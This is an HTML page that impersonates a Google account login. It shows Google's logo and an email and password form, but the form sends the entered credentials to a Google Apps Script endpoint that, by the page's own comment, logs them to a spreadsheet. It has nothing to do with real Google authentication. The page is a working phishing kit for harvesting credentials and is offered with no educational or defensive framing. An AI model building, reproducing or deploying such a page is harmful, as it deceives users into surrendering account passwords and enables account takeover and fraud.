<!DOCTYPE html>
<html lang="ur">
<head>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-8PLYFGLXW3"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'G-8PLYFGLXW3');
    </script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Log In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f2;
        }
        .container {
            background-color: white;
            padding: 20px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            width: 300px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 100px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
        }
        .btn-login {
            background-color: #1a73e8;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 30%;
            margin-top: 10px;
        }
        .btn-login:hover {
            background-color: #1557b0;
        }
        .error {
            color: red;
            display: none;
            margin-top: 10px;
        }
        .forgot-password {
            text-decoration: none;
            color: #1a73e8;
            display: block;
            margin-top: 10px;
            font-size: 0.9rem;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .create-account {
            background-color: #42b72a;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }
        .create-account:hover {
            background-color: #3aa325;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
        </div>
        <h2>Log In</h2>
        <p>Use your Google Account</p>
        <form method="POST" action="https://script.google.com/macros/s/AKfycbxkmnBujBrHe46FNf8qCvelRqYmQMgmyULtYxnPGmZkrVJJkN9eYCGMWbj9DgiO0Lh1/exec">
            <input name="Email" type="email" class="input-field" placeholder="Email" required>
            <input name="Password" type="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
            <div id="errorMsg" class="error">Please fill in all fields.</div>
        </form>
        </div>

    <script>
        function validateForm(event) {
            event.preventDefault();
            const email = document.querySelector('input[name="Email"]').value;
            const password = document.querySelector('input[name="Password"]').value;
            const errorMsg = document.getElementById('errorMsg');

            if (!email || !password) {
                errorMsg.style.display = 'block';
                return false;
            } else {
                errorMsg.style.display = 'none';
                document.querySelector('form').submit(); // Submit the form to Google Sheets
                return true;
            }
        }

        // Attach the validateForm function to the form's submit event
        document.querySelector('form').addEventListener('submit', validateForm);
    </script>
</body>
</html>
